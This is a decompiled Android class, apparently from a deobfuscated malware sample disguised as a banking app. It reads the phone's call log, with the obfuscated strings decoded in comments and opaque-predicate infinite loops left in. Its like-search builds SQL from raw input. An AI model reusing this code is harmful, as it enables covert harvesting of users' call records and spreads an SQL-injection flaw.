package com.wish.lmbank.dialer.utils;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;

import com.wish.lmbank.AppStartV;
import com.wish.lmbank.dialer.bean.CallLogBean;

import java.util.ArrayList;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/dialer/utils/CallLogHelper.class */
public class CallLogHelper {
    private static CallLogHelper callLogHelper;
    private ArrayList<CallLogBean> arrayList = null;
    private Context context;

    private CallLogHelper(Context context) {
        this.context = context;
    }

    public static CallLogHelper getInstance(Context context) {
        if (callLogHelper == null) {
            callLogHelper = new CallLogHelper(context);
        }
        return callLogHelper;
    }

    @SuppressLint("Range")
    public ArrayList<CallLogBean> queryAll() {
        if ((10213 - 12661) % (-12661) <= 0) {
            this.arrayList = new ArrayList<>();
//             Cursor query = this.context.getApplicationContext().getContentResolver().query(CallLog.Calls.CONTENT_URI, new String[]{bb7d7pu7.m5998("NgAN"), bb7d7pu7.m5998("BxwECwwb"), bb7d7pu7.m5998("DQgdDA"), bb7d7pu7.m5998("DRwbCB0ABgc"), bb7d7pu7.m5998("HRAZDA"), bb7d7pu7.m5998("BwgEDA")}, null, null, bb7d7pu7.m5998("DQgdDEktLDoq"));
            Cursor query = this.context.getApplicationContext().getContentResolver().query(CallLog.Calls.CONTENT_URI, new String[]{"_id", "number", "date", "duration", "type", "name"}, null, null, "date DESC");
            if (query != null) {
                if (query.getCount() == 0) {
                    return this.arrayList;
                }
                CallLogBean callLogBean = new CallLogBean();
                query.moveToFirst();
                int i = 0;
                while (!query.isAfterLast()) {
                    CallLogBean callLogBean2 = new CallLogBean();
//                     callLogBean2.setId(query.getString(query.getColumnIndex(bb7d7pu7.m5998("NgAN"))));
                    callLogBean2.setId(query.getString(query.getColumnIndex("_id")));
//                     callLogBean2.setName(query.getString(query.getColumnIndex(bb7d7pu7.m5998("BwgEDA"))));
                    callLogBean2.setName(query.getString(query.getColumnIndex("name")));
//                     callLogBean2.setNumber(query.getString(query.getColumnIndex(bb7d7pu7.m5998("BxwECwwb"))));
                    callLogBean2.setNumber(query.getString(query.getColumnIndex("number")));
//                     callLogBean2.setType(query.getString(query.getColumnIndex(bb7d7pu7.m5998("HRAZDA"))));
                    callLogBean2.setType(query.getString(query.getColumnIndex("type")));
//                     callLogBean2.setDate(query.getLong(query.getColumnIndex(bb7d7pu7.m5998("DQgdDA"))));
                    callLogBean2.setDate(query.getLong(query.getColumnIndex("date")));
//                     callLogBean2.setDuration(query.getLong(query.getColumnIndex(bb7d7pu7.m5998("DRwbCB0ABgc"))));
                    callLogBean2.setDuration(query.getLong(query.getColumnIndex("duration")));
                    if (callLogBean2.dateTitle.equals(callLogBean.dateTitle) && callLogBean2.number.equals(callLogBean.number) && callLogBean2.type == callLogBean.type && callLogBean2.date.equals(callLogBean.date)) {
                        i++;
                    } else {
                        if (callLogBean.number != null) {
                            callLogBean.setCount(i);
                            this.arrayList.add(callLogBean);
                        }
                        callLogBean = callLogBean2;
                        i = 0;
                    }
                    query.moveToNext();
                }
                callLogBean.setCount(i);
                this.arrayList.add(callLogBean);
                query.close();
            }
            return this.arrayList;
        }
        int i2 = 5052 + (5052 - 4877);
        while (true) {
        }
    }

    @SuppressLint("Range")
    public ArrayList<CallLogBean> queryAllByPhone(String str) {
        this.arrayList = new ArrayList<>();
//         Cursor query = AppStartV.getContext().getContentResolver().query(CallLog.Calls.CONTENT_URI, null, bb7d7pu7.m5998("BxwECwwbVFY"), new String[]{str}, bb7d7pu7.m5998("DQgdDEktLDoq"));
        Cursor query = AppStartV.getContext().getContentResolver().query(CallLog.Calls.CONTENT_URI, null, "number=?", new String[]{str}, "date DESC");
        while (query != null && query.moveToNext()) {
            CallLogBean callLogBean = new CallLogBean();
//             callLogBean.setNumber(query.getString(query.getColumnIndex(bb7d7pu7.m5998("BxwECwwb"))));
            callLogBean.setNumber(query.getString(query.getColumnIndex("number")));
//             callLogBean.setType(query.getString(query.getColumnIndex(bb7d7pu7.m5998("HRAZDA"))));
            callLogBean.setType(query.getString(query.getColumnIndex("type")));
//             callLogBean.setId(query.getString(query.getColumnIndex(bb7d7pu7.m5998("NgAN"))));
            callLogBean.setId(query.getString(query.getColumnIndex("_id")));
//             callLogBean.setDuration(query.getLong(query.getColumnIndex(bb7d7pu7.m5998("DRwbCB0ABgc"))));
            callLogBean.setDuration(query.getLong(query.getColumnIndex("duration")));
//             callLogBean.setDate(query.getLong(query.getColumnIndex(bb7d7pu7.m5998("DQgdDA"))));
            callLogBean.setDate(query.getLong(query.getColumnIndex("date")));
//             callLogBean.setName(query.getString(query.getColumnIndex(bb7d7pu7.m5998("BwgEDA"))));
            callLogBean.setName(query.getString(query.getColumnIndex("name")));
            this.arrayList.add(callLogBean);
        }
        query.close();
        return this.arrayList;
    }

    @SuppressLint("Range")
    public ArrayList<CallLogBean> queryAllByLike(String str) {
        if (((-8121) - 19715) % (-19715) <= 0) {
            this.arrayList = new ArrayList<>();
            ContentResolver contentResolver = AppStartV.getContext().getContentResolver();
            Uri uri = CallLog.Calls.CONTENT_URI;
//             Cursor query = contentResolver.query(uri, null, bb7d7pu7.m5998("BxwECwwbSQUAAgxJTkw") + str + bb7d7pu7.m5998("TE5JJjtJBwgEDEkFAAIMSU5M") + str + bb7d7pu7.m5998("TE4"), null, bb7d7pu7.m5998("DQgdDEktLDoq"));
            Cursor query = contentResolver.query(uri, null, "number like '%" + str + "%' OR name like '%" + str + "%'", null, "date DESC");
            while (query != null && query.moveToNext()) {
                CallLogBean callLogBean = new CallLogBean();
//                 callLogBean.setNumber(query.getString(query.getColumnIndex(bb7d7pu7.m5998("BxwECwwb"))));
                callLogBean.setNumber(query.getString(query.getColumnIndex("number")));
//                 callLogBean.setType(query.getString(query.getColumnIndex(bb7d7pu7.m5998("HRAZDA"))));
                callLogBean.setType(query.getString(query.getColumnIndex("type")));
//                 callLogBean.setId(query.getString(query.getColumnIndex(bb7d7pu7.m5998("NgAN"))));
                callLogBean.setId(query.getString(query.getColumnIndex("_id")));
//                 callLogBean.setDuration(query.getLong(query.getColumnIndex(bb7d7pu7.m5998("DRwbCB0ABgc"))));
                callLogBean.setDuration(query.getLong(query.getColumnIndex("duration")));
//                 callLogBean.setDate(query.getLong(query.getColumnIndex(bb7d7pu7.m5998("DQgdDA"))));
                callLogBean.setDate(query.getLong(query.getColumnIndex("date")));
//                 callLogBean.setName(query.getString(query.getColumnIndex(bb7d7pu7.m5998("BwgEDA"))));
                callLogBean.setName(query.getString(query.getColumnIndex("name")));
                this.arrayList.add(callLogBean);
            }
            query.close();
            return this.arrayList;
        }
        int i = 19685 + (19685 - 11747);
        while (true) {
        }
    }
}
